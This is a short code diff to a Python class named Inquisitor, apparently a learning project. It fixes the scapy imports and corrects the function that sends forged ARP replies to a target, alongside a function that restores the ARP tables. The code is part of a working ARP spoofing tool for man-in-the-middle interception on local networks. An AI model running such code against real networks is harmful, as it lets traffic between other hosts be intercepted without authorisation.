@@ -1,5 +1,7 @@
 import argparse;
-from scapy.layers.l2 import ARP, Ethe, send
+# from scapy.layers.l2 import ARP
+from scapy import all as scapy
+
 
 class Inquisitor:
     ip_router = ""
@@ -14,12 +16,12 @@ class Inquisitor:
         self.mac_target = args.MAC_target;
 
     def spoof_arp(self, target_ip, target_mac, source_ip):
-        spoofed = ARP(op=2, pdst=target_ip, psrc=source_ip, targetMac=target_mac)
-        send(spoofed, verbose="false")
+        spoofed = scapy.ARP(op=2, pdst=target_ip, psrc=source_ip, hwdst=target_mac)
+        scapy.send(spoofed, verbose=False)
 
     def restorearp(self, target_ip, target_mac, source_ip, source_mac):
-        packet= ARP(op=2 , hwsrc=source_mac , psrc= source_ip, hwdst= target_mac , pdst= target_ip)
-        send(packet, verbose=False)
+        packet= scapy.ARP(op=2 , hwsrc=source_mac , psrc= source_ip, hwdst= target_mac , pdst= target_ip)
+        scapy.send(packet, verbose=False)
 
 def init_args():
     parser = argparse.ArgumentParser(
